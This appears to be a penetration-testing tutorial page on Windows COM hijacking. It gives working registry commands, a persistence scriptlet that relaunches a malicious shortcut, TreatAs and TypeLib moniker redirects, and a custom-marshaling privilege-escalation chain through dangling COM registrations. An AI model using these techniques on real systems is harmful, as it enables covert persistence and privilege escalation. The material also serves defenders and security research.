# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Searching non-existent COM components

As the values of HKCU can be modified by the users **COM Hijacking** could be used as a **persistence mechanism**. Using `procmon` it's easy to find searched COM registries that don't exist yet and could be created by an attacker. Classic filters:

- **RegOpenKey** operations.
- where the _Result_ is **NAME NOT FOUND**.
- and the _Path_ ends with **InprocServer32**.

Useful variations during hunting:

- Also look for missing **`LocalServer32`** keys. Some COM classes are out-of-process servers and will launch an attacker-controlled EXE instead of a DLL.
- Search for **`TreatAs`** and **`ScriptletURL`** registry operations in addition to `InprocServer32`. Recent detection content and malware writeups keep calling these out because they are much rarer than normal COM registrations and therefore high-signal.
- Copy the legitimate **`ThreadingModel`** from the original `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` when cloning a registration into HKCU. Using the wrong model often breaks activation and makes the hijack noisy.<sup>[[3]](#references)</sup>
- On 64-bit systems inspect both 64-bit and 32-bit views (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` and `HKLM\Software\Classes\WOW6432Node`) because 32-bit applications may resolve a different COM registration.

Once you have decided which non-existent COM to impersonate, execute the following commands. _Be careful if you decide to impersonate a COM that is loaded every few seconds as that could be overkill._

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### Hijackable Task Scheduler COM components

Windows Tasks use Custom Triggers to call COM objects and because they're executed through the Task Scheduler, it's easier to predict when they're gonna be triggered.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Checking the output you can select one that is going to be executed **every time a user logs in** for example.

Now searching for the CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\CLASSES\ROOT\CLSID** and in HKLM and HKCU, you usually will find that the value doesn't exist in HKCU.

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

Then, you can just create the HKCU entry and every time the user logs in, your backdoor will be fired.

## Dangling COM Registrations and Custom Marshaling

A machine-wide COM registration can become a DLL-planting primitive without changing the registry. Look for an `InprocServer32` value whose DLL is absent and whose final path can be created or modified by a low-privileged user. Planting the exact DLL name makes any process that activates the CLSID load attacker code. In the CrossDevice example, the registered path was `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`, so a standard user could create the missing child directory and DLL.<sup>[[5]](#references)[[6]](#references)</sup>

### `IMarshal` as a cross-process DLL-load primitive

COM normally represents an interface pointer with a standard `OBJREF` that refers the receiver back to the original object. An object that implements `IMarshal` can instead produce a custom `OBJREF`. Its `GetUnmarshalClass` method supplies the CLSID of the code that will reconstruct the object in the receiving process. That CLSID does not need to identify the original object. COM resolves it as an in-process server and loads the registered DLL before dispatching the requested interface method.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

A minimal malicious implementation only needs to substitute the dangling CLSID in `GetUnmarshalClass`.<sup>[[6]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

Send this object through a proxied method parameter such as an `[in] IUnknown *`. Another option is `CoGetInstanceFromIStorage`, with the custom-marshaled object also implementing enough of `IStorage` to pass the local checks. Automatic unmarshaling in the remote server resolves the substituted CLSID, so the DLL load occurs before the target method runs.<sup>[[5]](#references)[[6]](#references)</sup>

The primitive is not limited to missing registrations. It can also force the receiver to load an existing custom-unmarshaler DLL and expose bugs in its load or unmarshaling path.<sup>[[6]](#references)</sup>

The chain needs all of the following conditions:<sup>[[6]](#references)</sup>

1. A machine-visible CLSID points to a missing or replaceable in-process DLL.
2. The attacker can place that DLL at the resolved path.
3. An activatable out-of-process COM server runs at the desired privilege level.
4. The server accepts custom marshaling and exposes a proxied call that carries the attacker object across the process boundary.

### Find dangling in-process servers

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) and [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) can enumerate the machine COM database and test each server through normal Win32 module resolution. This is preferable to `Test-Path` because some registrations contain only a filename and rely on the loader search path.<sup>[[6]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

Treat the result as a candidate list, not proof of exploitability. Resolve the path as the loader does, then inspect the DACL on the first existing parent and on the intended DLL if it already exists. A missing file is useful only when the attacker can create or replace the path that COM will actually resolve.<sup>[[6]](#references)</sup>

### Select and start a privileged receiver

Inspect candidate COM classes for `RunAs`, service association, available interfaces, and RPC proxies. A class configured for `SYSTEM` but not backed by a named service might fail direct activation because RPCSS cannot start it. In that case, look for an unprivileged trigger that starts its host, such as an executable scheduled task, and reproduce any named-event or IPC prerequisite that keeps the server alive.<sup>[[6]](#references)</sup>

For example, the vulnerable Shell Create Object Handler chain started its host by creating the expected global event before invoking a user-executable scheduled task.<sup>[[5]](#references)[[6]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

Map the resulting object reference back to its host and verify both identity and marshaling policy. Then enumerate interfaces and convert their proxies to IDL to find an input parameter such as `IUnknown *` that will marshal the fake object.<sup>[[6]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Custom-marshaling protections

A suitable receiver must not reject untrusted custom marshalers. Two process-wide protections are `EOAC_NO_CUSTOM_MARSHAL` in the capabilities passed to `CoInitializeSecurity` and `COMGLB_UNMARSHALING_POLICY_STRONG` set through `IGlobalOptions::Set`. With symbols, the corresponding state can be inspected in `combase!gCapabilities` and `combase!g_GLBOPT_UnmarshalingPolicy`; NtObjectManager exposes the result as `CustomMarshalAllowed` where its process parser supports the Windows build.<sup>[[6]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` allows one CLSID to be emulated by another one.<sup>[[4]](#references)</sup> From an offensive perspective this means you can leave the original CLSID untouched, create a second per-user CLSID that points to `scrobj.dll`, and then redirect the real COM object to the malicious one with `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

This is useful when:

- the target application already instantiates a stable CLSID at logon or on app start
- you want a registry-only redirect instead of replacing the original `InprocServer32`
- you want to execute a local or remote `.sct` scriptlet through the `ScriptletURL` value

Example workflow (adapted from public Atomic Red Team tradecraft and older COM registry abuse research):

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Notes:

- `scrobj.dll` reads the `ScriptletURL` value and executes the referenced `.sct`, so you can keep the payload as a local file or pull it remotely over HTTP/HTTPS.
- `TreatAs` is especially handy when the original COM registration is complete and stable in HKLM, because you only need a small per-user redirect instead of mirroring the entire tree.
- For validation without waiting on the natural trigger, you can instantiate the fake ProgID/CLSID manually with `rundll32.exe -sta <ProgID-or-CLSID>` if the target class supports STA activation.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) define COM interfaces and are loaded via `LoadTypeLib()`. When a COM server is instantiated, the OS may also load the associated TypeLib by consulting registry keys under `HKCR\TypeLib\{LIBID}`. If the TypeLib path is replaced with a **moniker**, e.g. `script:C:\...\evil.sct`, Windows will execute the scriptlet when the TypeLib is resolved – yielding a stealthy persistence that triggers when common components are touched.

This has been observed against the Microsoft Web Browser control (frequently loaded by Internet Explorer, apps embedding WebBrowser, and even `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>

### Steps (PowerShell)

1) Identify the TypeLib (LIBID) used by a high-frequency CLSID. Example CLSID often abused by malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) Point the per-user TypeLib path to a local scriptlet using the `script:` moniker (no admin rights required):

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) Drop a minimal JScript `.sct` that relaunches your primary payload (e.g. a `.lnk` used by the initial chain):

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) Triggering – opening IE, an application that embeds the WebBrowser control, or even routine Explorer activity will load the TypeLib and execute the scriptlet, re-arming your chain on logon/reboot.

Cleanup
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Notes
- You can apply the same logic to other high-frequency COM components; always resolve the real `LIBID` from `HKCR\CLSID\{CLSID}\TypeLib` first.
- On 64-bit systems you may also populate the `win64` subkey for 64-bit consumers.

## References

- [1] [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero issue 538151139 - CVE-2026-66804](https://project-zero.issues.chromium.org/issues/538151139)
- [6] [Project Zero - Windows Exploitation Techniques: Dangling COM Object Registrations](https://projectzero.google/2026/09/windows-dangling-com.html)
- [7] [Microsoft Learn - IMarshal interface](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [8] [Microsoft Open Specifications - MS-DCOM OBJREF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)

{{#include ../../banners/hacktricks-training.md}}

